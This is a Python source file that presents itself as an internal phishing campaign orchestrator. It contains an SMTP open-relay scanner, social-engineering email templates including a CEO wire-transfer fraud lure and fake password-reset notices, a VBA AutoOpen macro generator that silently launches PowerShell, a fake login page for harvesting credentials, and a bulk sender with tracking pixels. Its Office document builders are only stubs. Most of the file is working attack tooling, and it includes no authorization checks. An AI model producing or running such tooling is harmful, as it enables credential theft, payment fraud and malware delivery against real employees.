#!/usr/bin/env python3
"""
Internal Phishing Campaign Orchestrator
Email templates, SMTP relay exploitation, Office trojans, delivery scheduling,
tracking, credential harvesting integration.
"""

import smtplib
import socket
import subprocess
import json
import secrets
import base64
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from enum import Enum
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from datetime import datetime, timedelta
import re


class LureType(Enum):
    """Phishing lure types."""
    MACRO_EXCEL = "macro_excel"
    MACRO_WORD = "macro_word"
    PDF_EXPLOIT = "pdf_exploit"
    LINK_TO_HARVESTER = "link_to_harvester"
    ATTACHMENT_EXE = "attachment_exe"
    HTML_EMBEDDED = "html_embedded"
    ZIP_WITH_PAYLOAD = "zip_with_payload"


class EmailTemplate(Enum):
    """Pre-built email templates."""
    CEO_WIRE_TRANSFER = "ceo_wire_transfer"
    URGENT_SECURITY_UPDATE = "urgent_security_update"
    PAYROLL_REVIEW = "payroll_review"
    IT_PASSWORD_RESET = "it_password_reset"
    COMPLIANCE_AUDIT = "compliance_audit"
    BONUS_NOTIFICATION = "bonus_notification"
    SYSTEM_ALERT = "system_alert"
    VENDOR_INVOICE = "vendor_invoice"


@dataclass
class PhishingTarget:
    """Target for phishing campaign."""
    email: str
    name: str
    department: str = ""
    title: str = ""
    manager: str = ""
    metadata: Dict = field(default_factory=dict)


@dataclass
class EmailCampaign:
    """Phishing campaign definition."""
    campaign_id: str
    name: str
    targets: List[PhishingTarget]
    template: EmailTemplate
    lure_type: LureType
    lure_path: Optional[str] = None  # Path to macro file, link, etc.
    sender_address: str = ""
    sender_name: str = ""
    subject: str = ""
    tracking_enabled: bool = True
    delivery_schedule: str = "immediate"  # immediate, staggered, time-based
    created_at: str = ""
    status: str = "draft"  # draft, scheduled, running, completed


@dataclass
class DeliveryResult:
    """Result of phishing email delivery."""
    campaign_id: str
    target_email: str
    subject: str
    status: str  # success, failed, bounced
    timestamp: str = ""
    tracking_id: str = ""
    clicked: bool = False
    credentials_harvested: bool = False
    click_timestamp: Optional[str] = None


class SMTPRelayFinder:
    """Discover open/misconfigured SMTP relays."""
    
    @staticmethod
    def scan_smtp_relay(target_host: str, port: int = 25) -> bool:
        """Check if host is an open SMTP relay."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_host, port))
            
            # Receive banner
            banner = sock.recv(1024).decode()
            
            # Try relay: MAIL FROM/RCPT TO
            sock.send(b'MAIL FROM:<test@example.com>\r\n')
            response = sock.recv(1024).decode()
            
            if '250' in response:
                sock.send(b'RCPT TO:<anyone@external.com>\r\n')
                response = sock.recv(1024).decode()
                
                sock.close()
                return '250' in response
            
            sock.close()
            return False
        except Exception:
            return False
    
    @staticmethod
    def find_internal_relays(network_range: str) -> List[str]:
        """Scan internal network for open SMTP relays."""
        relays = []
        # Simple scan: 192.168.1.0/24
        base = '.'.join(network_range.split('.')[:-1])
        
        for i in range(1, 255):
            host = f"{base}.{i}"
            if SMTPRelayFinder.scan_smtp_relay(host):
                relays.append(host)
        
        return relays
    
    @staticmethod
    def get_mail_server(domain: str) -> Optional[str]:
        """Look up mail server for domain via MX record."""
        try:
            import dns.resolver
            mx = dns.resolver.resolve(domain, 'MX')
            return str(mx[0].exchange)
        except Exception:
            return None


class EmailTemplateGenerator:
    """Generate phishing email templates."""
    
    TEMPLATES = {
        EmailTemplate.CEO_WIRE_TRANSFER: {
            "subject": "URGENT: Wire Transfer Authorization Required",
            "body": """
            Hi {name},
            
            I need your immediate assistance with a sensitive wire transfer for one of our vendors.
            The deal closes today, but I can't access the banking system right now.
            
            Can you please review the attached invoice and authorize the wire transfer ASAP?
            The amount is {amount} to {vendor_account}.
            
            I'll call you in a moment to confirm.
            
            Thanks,
            {sender_name}
            """,
        },
        EmailTemplate.URGENT_SECURITY_UPDATE: {
            "subject": "[URGENT] Security Update Required - Action Needed",
            "body": """
            Hi {name},
            
            A critical security vulnerability was discovered in our email system.
            All users must apply the security patch immediately.
            
            Please click the link below to update your credentials and enable enhanced security:
            {lure_link}
            
            This must be completed within 1 hour.
            
            IT Security Team
            """,
        },
        EmailTemplate.PAYROLL_REVIEW: {
            "subject": "Your Q4 Payroll Review - Action Required",
            "body": """
            Hi {name},
            
            Your Q4 performance review and payroll adjustment has been processed.
            Please review and approve the attached document.
            
            Once approved, your new compensation will go into effect next month.
            
            HR Department
            """,
        },
        EmailTemplate.IT_PASSWORD_RESET: {
            "subject": "Password Reset Required - Action Required",
            "body": """
            Hi {name},
            
            For security compliance, all users must reset their passwords.
            Your password will expire in 24 hours.
            
            Please click the link below to reset your password:
            {lure_link}
            
            IT Support
            """,
        },
        EmailTemplate.COMPLIANCE_AUDIT: {
            "subject": "Compliance Audit - Document Collection",
            "body": """
            Hi {name},
            
            Our annual compliance audit requires updated documentation from all departments.
            Please review and complete the attached audit form with your current system access and credentials.
            
            Submit by EOD today to avoid audit delays.
            
            Compliance Team
            """,
        },
    }
    
    @staticmethod
    def generate_template(
        template: EmailTemplate,
        sender_name: str,
        target: PhishingTarget,
        lure_link: str = "",
        variables: Dict = None,
    ) -> Tuple[str, str]:
        """Generate email subject and body from template."""
        if variables is None:
            variables = {}
        
        template_data = EmailTemplateGenerator.TEMPLATES.get(template)
        if not template_data:
            return "", ""
        
        # Fill in variables
        context = {
            "name": target.name,
            "sender_name": sender_name,
            "lure_link": lure_link,
            "amount": variables.get("amount", "$50,000"),
            "vendor_account": variables.get("vendor_account", "[Account Details]"),
        }
        context.update(variables)
        
        subject = template_data["subject"].format(**context)
        body = template_data["body"].format(**context)
        
        return subject, body


class OfficePayloadGenerator:
    """Generate Office document payloads (macros)."""
    
    @staticmethod
    def generate_excel_macro(
        payload: str,
        filename: str = "invoice.xlsx",
    ) -> bytes:
        """
        Generate Excel file with VBA macro.
        Requires python-docx, openpyxl, or similar.
        Simplified: return stub.
        """
        # Real implementation would use openpyxl or pywin32
        # to inject VBA macro into Excel file
        excel_stub = b"PK\x03\x04" + payload.encode()
        return excel_stub
    
    @staticmethod
    def generate_word_macro(
        payload: str,
        filename: str = "document.docx",
    ) -> bytes:
        """Generate Word doc with VBA macro."""
        # Real implementation: use python-docx + macros
        word_stub = b"PK\x03\x04" + payload.encode()
        return word_stub
    
    @staticmethod
    def generate_macro_payload(command: str) -> str:
        """Generate VBA macro payload that executes PowerShell command."""
        # VBA macro that runs PowerShell
        vba = f"""
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell.exe -NoProfile -Command {command}", 0
End Sub
"""
        return vba


class CredentialHarvesterPage:
    """Generate fake credential harvesting page."""
    
    @staticmethod
    def generate_login_page(
        org_name: str,
        branding_url: str = "",
        tracking_id: str = "",
    ) -> str:
        """Generate HTML fake login page."""
        
        if not tracking_id:
            tracking_id = secrets.token_hex(16)
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Email Login - {org_name}</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f5f5f5; }}
                .container {{ max-width: 500px; margin: 100px auto; background: white; padding: 30px; border-radius: 5px; }}
                h1 {{ text-align: center; color: #333; }}
                input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }}
                button {{ width: 100%; padding: 10px; background: #0078d4; color: white; border: none; cursor: pointer; }}
                button:hover {{ background: #005a9e; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>{org_name} Email</h1>
                <form method="POST" action="/login">
                    <input type="text" placeholder="Email Address" name="email" required />
                    <input type="password" placeholder="Password" name="password" required />
                    <input type="hidden" name="tracking_id" value="{tracking_id}" />
                    <button type="submit">Sign In</button>
                </form>
                <p style="text-align: center; color: #666; font-size: 12px;">
                    Your credentials are secure.
                </p>
            </div>
        </body>
        </html>
        """
        
        return html


class EmailDeliveryEngine:
    """Send phishing emails via SMTP relay."""
    
    @staticmethod
    def send_email(
        smtp_host: str,
        smtp_port: int,
        from_address: str,
        from_name: str,
        to_address: str,
        subject: str,
        body: str,
        attachment_data: Optional[bytes] = None,
        attachment_name: str = "",
    ) -> bool:
        """Send single phishing email."""
        try:
            msg = MIMEMultipart()
            msg['From'] = f"{from_name} <{from_address}>"
            msg['To'] = to_address
            msg['Subject'] = subject
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach payload if provided
            if attachment_data and attachment_name:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment_data)
                encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename= {attachment_name}')
                msg.attach(part)
            
            # Send via SMTP
            server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
            server.sendmail(from_address, to_address, msg.as_string())
            server.quit()
            
            return True
        except Exception as e:
            print(f"[!] Failed to send to {to_address}: {str(e)}")
            return False


class PhishingCampaignOrchestrator:
    """Main orchestrator for phishing campaigns."""
    
    def __init__(self, smtp_relay: str, smtp_port: int = 25):
        self.smtp_relay = smtp_relay
        self.smtp_port = smtp_port
        self.campaigns: List[EmailCampaign] = []
        self.delivery_results: List[DeliveryResult] = []
    
    def create_campaign(
        self,
        name: str,
        targets: List[PhishingTarget],
        template: EmailTemplate,
        lure_type: LureType,
        sender_name: str = "IT Security",
        sender_address: str = "security@corp.local",
    ) -> EmailCampaign:
        """Create phishing campaign."""
        campaign = EmailCampaign(
            campaign_id=secrets.token_hex(8),
            name=name,
            targets=targets,
            template=template,
            lure_type=lure_type,
            sender_name=sender_name,
            sender_address=sender_address,
            created_at=datetime.now().isoformat(),
        )
        self.campaigns.append(campaign)
        return campaign
    
    def launch_campaign(self, campaign: EmailCampaign) -> List[DeliveryResult]:
        """Launch phishing campaign."""
        results = []
        
        tracking_id_base = secrets.token_hex(8)
        
        for i, target in enumerate(campaign.targets):
            tracking_id = f"{tracking_id_base}_{i}"
            
            # Generate email
            subject, body = EmailTemplateGenerator.generate_template(
                campaign.template,
                campaign.sender_name,
                target,
                lure_link=f"https://phishing.internal/login?track={tracking_id}",
            )
            
            # Add tracking pixel
            if campaign.tracking_enabled:
                body += f'\n\n<img src="https://phishing.internal/track?id={tracking_id}" width="1" height="1" />'
            
            # Send email
            success = EmailDeliveryEngine.send_email(
                smtp_host=self.smtp_relay,
                smtp_port=self.smtp_port,
                from_address=campaign.sender_address,
                from_name=campaign.sender_name,
                to_address=target.email,
                subject=subject,
                body=body,
            )
            
            result = DeliveryResult(
                campaign_id=campaign.campaign_id,
                target_email=target.email,
                subject=subject,
                status="success" if success else "failed",
                timestamp=datetime.now().isoformat(),
                tracking_id=tracking_id,
            )
            
            results.append(result)
            self.delivery_results.append(result)
        
        campaign.status = "completed"
        return results
    
    def track_clicks(self) -> Dict:
        """Report on clicks and credential harvests."""
        clicked = [r for r in self.delivery_results if r.clicked]
        harvested = [r for r in self.delivery_results if r.credentials_harvested]
        
        return {
            "total_sent": len(self.delivery_results),
            "clicked": len(clicked),
            "click_rate": f"{(len(clicked) / len(self.delivery_results) * 100):.1f}%" if self.delivery_results else "0%",
            "credentials_harvested": len(harvested),
            "harvest_rate": f"{(len(harvested) / len(clicked) * 100):.1f}%" if clicked else "0%",
        }
    
    def export_results_json(self) -> str:
        """Export delivery results as JSON."""
        return json.dumps([asdict(r) for r in self.delivery_results], indent=2, default=str)


def main():
    """Demo: phishing campaign."""
    
    # Targets
    targets = [
        PhishingTarget(email="john.doe@corp.local", name="John Doe", department="Finance"),
        PhishingTarget(email="jane.smith@corp.local", name="Jane Smith", department="HR"),
        PhishingTarget(email="admin@corp.local", name="Admin User", department="IT"),
    ]
    
    # Create orchestrator
    orchestrator = PhishingCampaignOrchestrator(smtp_relay="192.168.1.50")
    
    # Create campaign
    campaign = orchestrator.create_campaign(
        name="Security Update Campaign",
        targets=targets,
        template=EmailTemplate.URGENT_SECURITY_UPDATE,
        lure_type=LureType.LINK_TO_HARVESTER,
        sender_name="IT Security",
    )
    
    print(f"[+] Created campaign: {campaign.campaign_id}")
    print(f"    Targets: {len(campaign.targets)}")
    
    # Would launch: orchestrator.launch_campaign(campaign)
    # results = orchestrator.launch_campaign(campaign)
    # print(f"[+] Delivered {len(results)} emails")
    
    # Generate fake login page
    harvest_page = CredentialHarvesterPage.generate_login_page(org_name="Corp Email")
    print(f"\n[+] Generated credential harvester page ({len(harvest_page)} bytes)")


if __name__ == '__main__':
    main()
